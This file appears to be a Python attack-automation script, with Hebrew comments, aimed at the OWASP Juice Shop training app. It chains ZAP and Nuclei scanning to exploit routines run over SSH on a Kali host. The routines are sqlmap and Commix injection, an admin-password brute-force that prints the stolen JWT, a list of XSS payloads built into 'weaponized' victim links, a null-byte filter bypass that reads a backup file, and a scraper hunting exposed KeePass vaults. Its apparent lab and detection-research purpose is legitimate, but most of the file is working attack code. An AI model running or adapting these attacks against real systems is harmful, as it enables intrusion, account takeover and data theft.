import argparse
import os
import time
from pathlib import Path
from urllib.parse import urlparse

from dotenv import load_dotenv
import paramiko
import threading
import json
import re
import requests

try:
  from zapv2 import ZAPv2
except ImportError as exc:
  raise SystemExit("Missing dependency 'zaproxy'. Install the packages in requirements.txt first.") from exc


DEFAULT_ZAP_PROXY = "http://192.168.190.129:8081"
DEFAULT_POLL_INTERVAL = 2
SQL_INJECTION_NAME = "sql injection"


def parse_args() -> argparse.Namespace:
  parser = argparse.ArgumentParser(
    description="Run a ZAP spider scan followed by an active scan against a target URL.",
  )
  parser.add_argument("target_url", help="Target URL to scan, for example http://localhost:3000")
  parser.add_argument(
    "--poll-interval",
    type=int,
    default=DEFAULT_POLL_INTERVAL,
    help="Seconds to wait between scan progress checks.",
  )
  return parser.parse_args()


def load_settings() -> tuple[str, str]:
  env_path = Path(__file__).with_name(".env")
  load_dotenv(env_path)

  api_key = os.getenv("ZAP_API_KEY", "").strip()
  kali_ip = os.getenv("KALI_IP", "").strip() or "the configured Kali machine"
  return api_key, kali_ip


def validate_target_url(target_url: str) -> str:
  parsed = urlparse(target_url)
  if parsed.scheme not in {"http", "https"} or not parsed.netloc:
    raise ValueError("Target URL must include http:// or https:// and a valid host.")
  return target_url.rstrip("/")


def create_zap_client(api_key: str) -> ZAPv2:
  return ZAPv2(
    apikey=api_key,
    proxies={
      "http": DEFAULT_ZAP_PROXY,
      "https": DEFAULT_ZAP_PROXY,
    },
  )


def wait_for_completion(label: str, status_getter, scan_id: str, poll_interval: int) -> None:
  last_status = None

  while True:
    status = int(status_getter(scan_id))
    if status != last_status:
      print(f"[*] {label} progress: {status}%")
      last_status = status

    if status >= 100:
      print(f"[+] {label} completed.")
      return

    time.sleep(poll_interval)


def wait_for_ajax_spider(zap: ZAPv2, poll_interval: int) -> None:
  last_status = None
  saw_running = False

  time.sleep(poll_interval)

  while True:
    status = str(zap.ajaxSpider.status).strip().lower()
    if status != last_status:
      print(f"[*] AJAX Spider status: {status}")
      last_status = status

    if status == "running":
      saw_running = True
    elif saw_running or status == "stopped":
      print("[+] AJAX Spider completed.")
      return

    time.sleep(poll_interval)


def fetch_all_alerts(zap: ZAPv2) -> list[dict]:
  alerts = []
  start = 0
  count = 500

  while True:
    batch = zap.core.alerts(start=start, count=count)
    alerts.extend(batch)

    if len(batch) < count:
      return alerts

    start += count


def is_sql_injection(alert: dict) -> bool:
  return SQL_INJECTION_NAME in alert.get("alert", "").strip().lower()


def print_alerts(alerts: list[dict]) -> None:
  if not alerts:
    print("[*] No alerts were found.")
    return

  print(f"\n[!] Alerts found: {len(alerts)}")
  for index, alert in enumerate(alerts, start=1):
    print("=" * 80)
    print(f"[ALERT {index}] {alert.get('alert', 'Unknown alert')}")
    print(f"URL: {alert.get('url', 'N/A')}")
    print(f"Risk: {alert.get('risk', 'N/A')}")

    param = alert.get("param", "").strip()
    if param:
      print(f"Parameter: {param}")

    evidence = alert.get("evidence", "").strip()
    if evidence:
      print(f"Evidence: {evidence}")

    description = alert.get("description", "").strip()
    if description:
      print(f"Description: {description}")
  print("=" * 80)


def announce_sqlmap_placeholder(kali_ip: str) -> None:
  print(f"[!] SQL Injection detected. Triggering sqlmap placeholder for Kali machine: {kali_ip}")
  if os.name == "nt":
    os.system(f"echo SQL Injection detected. Would now launch sqlmap on the Kali machine {kali_ip}.")
    return

  os.system(f'echo "SQL Injection detected. Would now launch sqlmap on the Kali machine {kali_ip}."')

def run_remote_sqlmap(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating automated SQLMap attack on raw URL: {target_url}")
    
    # === ניקוי ה-URL והוספת לייזר (Asterisk) ===
    # הפעם נחליף את q=1 ב-q=1* # הכוכבית אומרת ל-SQLMap: אל תעשה בדיקות רקע, פשוט תזריק את הקוד הזדוני בדיוק כאן!
    clean_url = re.sub(r'q=.*', 'q=1*', target_url)
    print(f"[*] Sanitized and targeted URL for SQLMap: {clean_url}")
    
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        # בניית פקודת התקיפה:
        # 1. הורדנו את --smart
        # 2. --technique=BEU - מיקוד בשיטות פריצה שמתאימות לאפליקציות מודרניות
        sqlmap_cmd = f"sqlmap -u \"{clean_url}\" --batch --tables --dbms=sqlite --technique=BEU --level=2 --risk=2 --random-agent --flush-session"
        #sqlmap_cmd = f"sqlmap -u \"{clean_url}\" --batch -T Users --dump --dbms=sqlite --technique=BEU --level=2 --risk=2 --random-agent 2>&1"
        print(f"[*] Executing payload: {sqlmap_cmd}")
        
        stdin, stdout, stderr = ssh.exec_command(sqlmap_cmd)
        
        output = stdout.read().decode('utf-8')
        
        print("\n=== SQLMAP OUTPUT ===")
        print(output)
        print("=====================\n")
            
    except Exception as e:
        print(f"[-] Automated attack failed: {e}")
    finally:
        ssh.close()

def run_remote_dirb(target_url: str, kali_ip: str) -> None:
    print(f"\n[*] Launching Dirb for directory discovery on: {target_url}")
    
    # משיכת פרטי ההתחברות מה-.env
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        # בניית הפקודה - Dirb סורק את כתובת הבסיס שמצאנו
        dirb_cmd = f"dirb {target_url}" 
        print(f"[*] Executing payload: {dirb_cmd}")
        
        # הרצה
        stdin, stdout, stderr = ssh.exec_command(dirb_cmd)
        output = stdout.read().decode('utf-8')
        
        print("\n=== DIRB OUTPUT ===")
        print(output)
        print("=====================\n")
            
    except Exception as e:
        print(f"[-] Directory discovery failed: {e}")
    finally:
        ssh.close()

def run_remote_nuclei(target_url: str, kali_ip: str, results_list: list) -> None:
    print(f"\n[*] Launching Nuclei vulnerability scanner on: {target_url}")
    
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        # הפקודה הממוקדת שלנו
        nuclei_cmd = f"nuclei -u {target_url} -tags cve,vuln,exposure,misconfig,panel -severity critical,high,medium -rl 50 -c 10 -jsonl"
        print(f"[*] Executing payload: {nuclei_cmd}")
        
        stdin, stdout, stderr = ssh.exec_command(nuclei_cmd)
        
        error_output = stderr.read().decode('utf-8')
        if error_output:
            print(f"\n[-] Nuclei System Logs/Errors:\n{error_output}\n")

        for line in stdout:
            try:
                data = json.loads(line.strip())
                finding = {
                    "alert": data.get("info", {}).get("name", "Nuclei Finding"),
                    "url": data.get("matched-at", target_url),
                    "risk": data.get("info", {}).get("severity", "Unknown").capitalize(),
                    "source": "Nuclei"
                }
                results_list.append(finding)
            except json.JSONDecodeError:
                continue 
                
        print(f"[+] Nuclei scan completed. Found {len(results_list)} issues.")
            
    except Exception as e:
        print(f"[-] Nuclei scan failed: {e}")
    finally:
        ssh.close()

def run_remote_commix(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating automated Commix OS-Injection attack on: {target_url}")
    
    # === ניקוי ה-URL ===
    # אנחנו מנקים את הפיילוד ש-ZAP שלח, כדי לתת ל-Commix להתחיל את ההזרקות שלו מדף נקי
    clean_url = re.sub(r'q=.*', 'q=1', target_url)
    print(f"[*] Sanitized URL for Commix: {clean_url}")
    
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        # בניית פקודת התקיפה:
        # --batch: מונע שאלות אינטראקטיביות (Yes/No) שעלולות לתקוע את הסקריפט
        # --current-user: אם ההתקפה מצליחה, תדפיס איזה משתמש מריץ את השרת (לרוב www-data או root)
        # --hostname: ידפיס את שם השרת כדי להוכיח RCE
        # 2>&1: תופס את כל הפלט, גם אם הוא נזרק לערוץ השגיאות
        #commix_cmd = f"commix --url {clean_url} --batch --current-user --hostname 2>&1"
        commix_cmd = f"commix --url {clean_url} --batch -v 3 --current-user --hostname 2>&1"
        print(f"[*] Executing payload: {commix_cmd}")
        
        stdin, stdout, stderr = ssh.exec_command(commix_cmd)
        
        print("\n=== COMMIX REAL-TIME OUTPUT ===")
        # קריאה והדפסה בזמן אמת, בדיוק כמו שעשינו ב-SQLMap
        for line in stdout:
            print(line.strip())
        print("=============================\n")
            
    except Exception as e:
        print(f"[-] Automated Commix attack failed: {e}")
    finally:
        ssh.close()

def run_custom_admin_hijacker(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating Custom API Attack: Admin Account Hijacking...")
    
    # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    login_api = f"{base_url}/rest/user/login"
    print(f"[*] Targeting Login API: {login_api}")
    
    # רשימת סיסמאות נפוצות (במציאות זה יהיה קובץ של אלפים, פה נשים את הקלאסיות)
    passwords_to_try = ["123456", "password", "admin", "admin123", "admin@123", "root"]
    admin_email = "admin@juice-sh.op" # האימייל הקבוע של מנהל ה-Juice Shop
    
    success = False
    
    for pwd in passwords_to_try:
        print(f"[*] Trying credentials -> {admin_email} : {pwd}")
        
        # מבנה הבקשה ש-Juice Shop מצפה לקבל
        payload = {"email": admin_email, "password": pwd}
        
        try:
            response = requests.post(login_api, json=payload, timeout=5)
            
            # אם קיבלנו 200, הפריצה הצליחה!
            if response.status_code == 200:
                data = response.json()
                token = data.get('authentication', {}).get('token', 'NO_TOKEN')
                print("\n" + "="*40)
                print("[+++] CRITICAL VULNERABILITY EXPLOITED [+++]")
                print("[+] Admin account compromised successfully!")
                print(f"[+] Password found: {pwd}")
                print(f"[+] Admin JWT Token stolen:\n{token}")
                print("="*40 + "\n")
                success = True
                break
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            
    if not success:
        print("[-] Brute force failed. Password might be complex.")

# def run_remote_xsstrike(target_url: str, kali_ip: str) -> None:
#     print(f"\n[!] Initiating Advanced XSS Analysis with XSStrike on: {target_url}")
    
#     # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
#     from urllib.parse import urlparse
#     parsed = urlparse(target_url)
#     base_url = f"{parsed.scheme}://{parsed.netloc}"
    
#     # בניית הכתובת הנקייה של ממשק המשתמש (UI) שפגיע ל-XSS
#     clean_url = f"{base_url}/#/search?q=1"
    
#     username = os.getenv("KALI_USER", "kali")
#     password = os.getenv("KALI_PASSWORD", "kali")
    
#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
#     try:
#         ssh.connect(hostname=kali_ip, username=username, password=password)
        
#         # פקודה ממוקדת על ממשק הלקוח
#         xsstrike_cmd = f"python3 /usr/share/xsstrike/xsstrike.py -u \"{clean_url}\" --timeout 15 --console-log-level INFO 2>&1"
        
#         print(f"[*] Executing XSStrike: {xsstrike_cmd}")
#         stdin, stdout, stderr = ssh.exec_command(xsstrike_cmd)
        
#         print("\n=== XSSTRIKE REAL-TIME OUTPUT ===")
#         for line in stdout:
#             print(line.strip())
#         print("================================\n")
            
#     except Exception as e:
#         print(f"[-] XSStrike attack failed: {e}")
#     finally:
#         ssh.close()

def run_custom_xss_weaponizer(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating Custom XSS Weaponizer for SPA Architecture...")
    
    from urllib.parse import urlparse, quote
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    # 20 פיילודים מובחרים המייצגים וקטורי תקיפה שונים (DOM, Angular Bypasses, HTML5)
    payloads = [
        '<script>alert("XSS_1_Classic")</script>',
        '<img src="x" onerror="alert(\'XSS_2_Image\')">',
        '<svg onload="alert(\'XSS_3_SVG\')">',
        '<iframe src="javascript:alert(\'XSS_4_Iframe\')">',
        '"><script>alert("XSS_5_BreakOut")</script>',
        '\'><script>alert("XSS_6_BreakOut_Single")</script>',
        '<body onload="alert(\'XSS_7_Body\')">',
        '<input autofocus onfocus="alert(\'XSS_8_Input\')">',
        '<details open ontoggle="alert(\'XSS_9_Details\')">',
        '<video><source onerror="alert(\'XSS_10_Video\')"></video>',
        '<audio src="x" onerror="alert(\'XSS_11_Audio\')"></audio>',
        '<a href="javascript:alert(\'XSS_12_Link\')">Click Me</a>',
        '<object data="javascript:alert(\'XSS_13_Object\')"></object>',
        '<<script>alert("XSS_14_DoubleTag")</script>',
        '<script src="data:,alert(\'XSS_15_DataURI\')"></script>',
        '{{constructor.constructor("alert(\'XSS_16_Angular_Bypass\')")()}}',
        '{{$on.constructor("alert(\'XSS_17_Angular_Bypass_2\')")()}}',
        '\\x3Cscript\\x3Ealert("XSS_18_HexEncoded")\\x3C/script\\x3E',
        'javascript://%250Aalert("XSS_19_ProtocolBypass")',
        '<svg/onload=alert("XSS_20_NoSpaces")>'
    ]

    print("[*] Generating 20 Weaponized Links for DOM-based XSS...")
    print("="*80)
    
    for i, payload in enumerate(payloads, 1):
        # קידוד הפיילוד כדי שיוכל לעבור ב-URL ללא שגיאות
        encoded_payload = quote(payload)
        
        # בניית הקישור המורעל שיישלח לקורבן
        weaponized_url = f"{base_url}/#/search?q={encoded_payload}"
        
        print(f"[Payload {i:02d}] {payload}")
        print(f"[Link] -> {weaponized_url}\n")

    print("[+] Weaponization complete.")
    print("[*] Action for CrossGuard-AI: Feed these generated links into the messaging platform to test the detection model.")
    print("="*80 + "\n")

def run_remote_lfi_extractor(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating Advanced Arbitrary File Read Attack...")
    
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        # הפיבוט (Pivot) המושלם:
        # אנחנו מפסיקים לנסות לברוח מהתיקייה עם ../
        # במקום זאת, אנחנו מנצלים את המודיעין מה-FTP Pillager!
        # אנחנו מבקשים את קובץ הגיבוי ועוקפים רק את סינון הסיומות.
        payload = "/ftp/package.json.bak%2500.md"
        attack_url = f"{base_url}{payload}"
        
        curl_cmd = f"curl -s \"{attack_url}\""
        
        print(f"[*] Executing payload: Extension Bypass (%2500.md) on internal backup file...")
        stdin, stdout, stderr = ssh.exec_command(curl_cmd)
        
        output = stdout.read().decode('utf-8')
        
        # אנחנו בודקים אם קובץ הקונפיגורציה נשאב בהצלחה
        if "juice-shop" in output or "dependencies" in output:
            print("\n" + "="*70)
            print("[+++] CRITICAL ARBITRARY FILE READ EXPLOITED [+++]")
            print("[+] Successfully bypassed file extension restrictions!")
            print("[+] Filter evasion successful using Poisoned Null Byte (%2500.md)")
            print("\n[*] Extracted 'package.json.bak' from server (First 15 lines):")
            
            # מדפיסים את התוכן של הקובץ ששאבנו!
            for line in output.split('\n')[:15]:
                if line.strip():
                    print(f"    {line}")
            print("="*70 + "\n")
        else:
            print("[-] Attack blocked. Output received:")
            print(output[:200]) 
            
    except Exception as e:
        print(f"[-] Attack failed: {e}")
    finally:
        ssh.close()

def run_ftp_data_pillager(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating Exposed Data Pillager (Security Misconfiguration)...")
    
    import requests
    import re
    from urllib.parse import urlparse
    
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    # חיבור לתגלית ש-Dirb מצא עבורנו קודם לכן
    ftp_url = f"{base_url}/ftp/"
    print(f"[*] Exploiting exposed directory: {ftp_url}")
    
    try:
        # שימוש ב-User-Agent רגיל כדי להיראות כמו דפדפן
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        response = requests.get(ftp_url, headers=headers, timeout=10)
        
        # אם התיקייה פתוחה וחשופה לציבור
        if response.status_code == 200:
            # שימוש בביטוי רגולרי (Regex) לחילוץ קבצים מסוכנים (כספות, גיבויים, מסמכים)
            files = re.findall(r'href="([^"]+\.(?:kdbx|bak|md|pdf))"', response.text)
            
            if files:
                print("\n" + "="*70)
                print("[+++] CRITICAL DATA LEAKAGE EXPLOITED [+++]")
                print("[+] Security Misconfiguration bypassed! Exfiltrating sensitive files:")
                
                # הדפסת הקבצים ש"נגנבו" (שימוש ב-set למניעת כפילויות בפלט)
                for f in set(files):
                    print(f"    -> Stolen internal file: {f}")
                    
                # התראה קריטית אם מצאנו את כספת הסיסמאות
                if any(".kdbx" in f for f in files):
                    print("\n[!] FATAL: 'incident-support.kdbx' (KeePass Database) detected!")
                    print("[!] Attackers can download and crack this offline to steal ALL corporate passwords.")
                print("="*70 + "\n")
            else:
                print("[-] Connected to /ftp, but no highly sensitive files were matched.")
        else:
            print(f"[-] Failed to access /ftp. Target might have patched the directory listing.")
            
    except Exception as e:
        print(f"[-] FTP Pillager attack failed: {e}")

EXPLOIT_ROUTER = {
    "sql injection": run_remote_sqlmap,
    # הסרנו את commix כי הוא פחות רלוונטי לאפליקציה הזו
    "cross site scripting": run_custom_xss_weaponizer,
    
    # מכת המחץ המרובעת!
    "injection": [
        run_custom_admin_hijacker,   # פריצת חשבון (Logic)
        run_custom_xss_weaponizer,   # שליטת דפדפן (Client-Side)
        run_remote_lfi_extractor,    # שאיבת קבצי לינוקס (OS-Level)
        run_ftp_data_pillager        # גניבת מידע תאגידי (Misconfiguration)
    ],
}

def main() -> int:
  args = parse_args()

  try:
    target_url = validate_target_url(args.target_url)
  except ValueError as exc:
    print(f"[-] {exc}")
    return 1

  api_key, kali_ip = load_settings()
  if not api_key:
    print("[-] Missing ZAP_API_KEY in security-tool/.env.")
    return 1

  try:
    # === שלב 1: סריקות במקביל (ZAP + Nuclei) ===
    print("\n[*] [PHASE 1] Starting parallel scans (ZAP and Nuclei)...")
    
    # ניצור רשימה ריקה שתתמלא מתוך ה-Thread של Nuclei
    nuclei_alerts = []
    
    # משגרים את Nuclei שיעבוד ברקע על ה-Kali במקביל
    nuclei_thread = threading.Thread(target=run_remote_nuclei, args=(target_url, kali_ip, nuclei_alerts))
    nuclei_thread.start()

    # בינתיים, התוכנית הראשית שלנו מריצה את ZAP
    print(f"[*] Connecting to ZAP at {DEFAULT_ZAP_PROXY}")
    zap = create_zap_client(api_key)
    print(f"[+] Connected to ZAP version {zap.core.version}")

    print(f"[*] Opening target in ZAP: {target_url}")
    zap.urlopen(target_url)

    print("[*] Starting AJAX spider scan...")
    zap.ajaxSpider.scan(url=target_url)
    wait_for_ajax_spider(zap, args.poll_interval)

    print("[*] Waiting 5 seconds for passive scanning to settle...")
    time.sleep(5)

    print("[*] Starting active scan...")
    active_scan_id = zap.ascan.scan(target_url)
    wait_for_completion("Active Scan", zap.ascan.status, active_scan_id, args.poll_interval)

    zap_alerts = fetch_all_alerts(zap)
    print(f"[*] Retrieved {len(zap_alerts)} alerts from ZAP.")
    print_alerts(zap_alerts)

    # ZAP סיים. עכשיו אנחנו מוודאים שגם Nuclei סיים לפני שממשיכים
    print("\n[*] Waiting for Nuclei background scan to complete...")
    nuclei_thread.join() 
    print("[+] Phase 1 Complete. All scanners finished.")

    # === שלב 2: איחוד הנתונים (Data Normalization) ===
    print("\n[*] [PHASE 2] Merging findings from all scanners...")
    # עכשיו אנחנו באמת מאחדים את שני מקורות המודיעין ל"בריכה" אחת!
    all_findings = zap_alerts.copy() 
    all_findings.extend(nuclei_alerts)
    print(f"[*] Total vulnerabilities aggregated for routing: {len(all_findings)}")

    # === שלב 3: הנתב - תקיפה ממוקדת (Exploitation) ===
    print("\n[*] [PHASE 3] Routing alerts to exploit tools...")
    
    launched_tools = set()
    active_attack_threads = []
    
    # הפעלת ברירת מחדל: Dirb לטובת גילוי נתיבים (כי ZAP לא תמיד רואה ספריות נסתרות)
    if "run_remote_dirb" not in launched_tools:
        print("[*] Triggering default reconnaissance: run_remote_dirb")
        dirb_thread = threading.Thread(target=run_remote_dirb, args=(target_url, kali_ip))
        active_attack_threads.append(dirb_thread)
        dirb_thread.start()
        launched_tools.add("run_remote_dirb")

    # ניתוב חכם לפי ממצאים למילון הכלים (EXPLOIT_ROUTER)
    for finding in all_findings:
        alert_name = finding.get('alert', '').lower()
        url = finding.get('url', '')
        
        for vulnerability_keyword, actions in EXPLOIT_ROUTER.items():
            if vulnerability_keyword in alert_name:
                
                # תמיכה גם בכלי בודד וגם ברשימת כלים מאותו סוג התראה
                if isinstance(actions, list):
                    funcs_to_run = actions
                else:
                    funcs_to_run = [actions]
                    
                for attack_function in funcs_to_run:
                    if attack_function.__name__ not in launched_tools:
                        print(f"[*] Match! Routing '{vulnerability_keyword}' to {attack_function.__name__}")
                        
                        t = threading.Thread(target=attack_function, args=(url, kali_ip))
                        active_attack_threads.append(t)
                        t.start()
                        
                        launched_tools.add(attack_function.__name__)
                
    # המתנה לסיום כל כלי התקיפה והמודיעין
    if active_attack_threads:
        print(f"[*] Waiting for {len(active_attack_threads)} attack/recon tools to finish...")
        for t in active_attack_threads:
            t.join()

    print("\n[+] All automated attacks have completed successfully!")

  except KeyboardInterrupt:
    print("\n[-] Scan interrupted by user.")
    return 130
  except Exception as exc:
    print(f"[-] Scan failed: {exc}")
    return 1

  return 0


if __name__ == "__main__":
  raise SystemExit(main())
